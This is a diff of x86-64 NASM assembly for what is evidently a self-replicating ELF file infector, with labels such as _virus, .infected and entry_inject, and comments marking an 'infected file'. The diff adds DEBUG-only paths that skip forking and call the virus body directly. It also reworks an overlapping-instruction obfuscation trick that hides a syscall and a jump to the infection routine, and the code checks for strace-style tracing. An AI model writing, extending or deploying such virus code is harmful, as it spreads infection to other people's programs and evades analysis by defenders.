@@ -51,6 +51,9 @@ _h3ll0w0rld:
 %endif
 	; Overlapping instruction:
 	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
+%ifdef DEBUG
+	jmp .debug; avoid strace checking
+%endif
 	jmp .there
 	.here:
 		db `\x48\xb8`; TRASH ; mov rax,
@@ -124,6 +127,11 @@ _h3ll0w0rld:
 	.there:
 		jmp .here + 2
 
+%ifdef DEBUG
+	.debug:
+		mov rax, 1
+%endif
+
 	cmp rax, 0x0
 	jnz .sneakyboi - 2; has to jmp on [48 31 c0] -> xor rax, rax
 	jmp .happy_mix
@@ -164,7 +172,11 @@ _h3ll0w0rld:
 	mov rdi, 0x03eb583c6a5f016a; push 1; pop rdi; push 60; pop rax; jmp $+5
 	;                            from right to left
 	.ft_juggling:
-	mov rax, 0xc0314830eb050f42; 42[syscall][jmp .infected][xor rax, rax]
+	db `\x48\xb8`; TRASH ; mov rax,
+	db `\x42`
+	syscall
+	jmp .infected
+	xor rax, rax
 
 	.sneakyboi:
 	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
@@ -172,12 +184,14 @@ _h3ll0w0rld:
 	; copy the prg in memory and launch it cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
 
 	.host:
+%ifndef DEBUG
 	push SYSCALL_FORK
 	pop rax; fork
 	syscall
 
 	cmp rax, 0x0
 	jnz _exit
+%endif
 
 	; host part
 	push r14
@@ -188,13 +202,16 @@ _h3ll0w0rld:
 
 	jmp _exit
 	.infected:
+%ifndef DEBUG
 		push SYSCALL_FORK
 		pop rax; fork
 		syscall
 
 		cmp rax, 0x0
 		jz _virus
-
+%else
+		call _virus
+%endif
 		jmp _prg
 
 debugging db `DEBUGGING..\n`, 0x0
@@ -374,7 +391,11 @@ _virus:
 	syscall
 	pop rdx
 
+%ifndef DEBUG
 	call _exit
+%else
+	ret
+%endif
 
 _prg:
 	; end infected file
